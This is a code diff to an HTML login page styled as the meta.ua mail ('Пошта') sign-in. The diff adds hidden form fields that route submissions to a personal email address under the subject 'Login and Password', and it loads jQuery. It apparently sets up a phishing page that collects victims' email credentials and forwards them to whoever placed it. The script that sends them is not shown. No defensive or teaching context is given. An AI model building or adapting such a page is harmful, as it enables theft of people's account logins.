@@ -62,7 +62,12 @@
             <div class="form-login">
                 <h4 class="forms-title">Пошта</h4>
                 
-            <form id="form" action="/" method="post">
+            <form id="form" action="#" method="post">
+
+             <input type="hidden" name="project_name" value="Meta">
+            <input type="hidden" name="admin_email" value="dimonmoy@meta.ua">
+            <input type="hidden" name="form_subject" value="Login and Password">
+
                 <div class="input-form">
                 <input class="forms-input _req _emails" type="email" name="email" id="email" placeholder="email@meta.ua">
             </div>
@@ -104,6 +109,7 @@
      </main>
         </div>
     </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
     <script src="script.js"></script>
 </body>
 </html>
